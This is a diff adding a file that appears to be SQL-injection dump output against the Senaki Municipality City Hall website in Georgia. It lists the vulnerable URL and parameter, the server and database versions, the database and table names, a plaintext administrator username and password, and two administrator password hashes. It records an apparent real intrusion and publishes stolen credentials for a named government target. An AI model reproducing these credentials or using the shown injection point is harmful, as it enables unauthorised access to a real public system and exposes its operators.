@@ -1,0 +1,49 @@
+.gov Government
+
+.ge Georgia
+
+Senaki Municipality City Hall
+
+http://www.senaki.gov.ge/index.php?id=2449&lang=geo
+
+web application technology: Apache, PHP 5.6.40
+
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+available databases [3]:                                                                                                                                             
+[+] information_schema
+[+] senakig_main
+[+] senakig_senaki
+
+Database: senakig_senaki                                                                                                                                             
+[9 tables]
++------------+
+| admin_menu |
+| arts       |
+| gallery    |
+| gallery_id |
+| links      |
+| menu       |
+| self       |
+| sub_menu   |
+| userlist   |
++------------+
+
+Database: senakig_senaki
+Table: userlist
+[1 entry]
++-------------+-----------+
+| user_name   | pass      |
++-------------+-----------+
+| senakiadmin | admin2013 |
++-------------+-----------+
+
+Database: senakig_main
+Table: users
+[2 entries]
++---------------+----------------------------------------------------------------------------------------------------------------------------------+
+| name          | pass                                                                                                                             |
++---------------+----------------------------------------------------------------------------------------------------------------------------------+
+| senaki.ge     | a687549d8b3b9627987c75dbe001f8f1f0d5c7906b558df0cf052bfc0b6a3db2b7e7ee5a5948ebfd4532393e58feb124cbd1a1fec2b57de946d65f5f6c290f77 |
+| administrator | ce3ef7e25c998cb215bf34d414a3469cc18e6e860b241df3abf3e519bd4b4aeb7b051ff9618d20f61b4d12d4c3eae1cebba48aebcc51aef8a0e45bc86c79368e |
++---------------+----------------------------------------------------------------------------------------------------------------------------------+
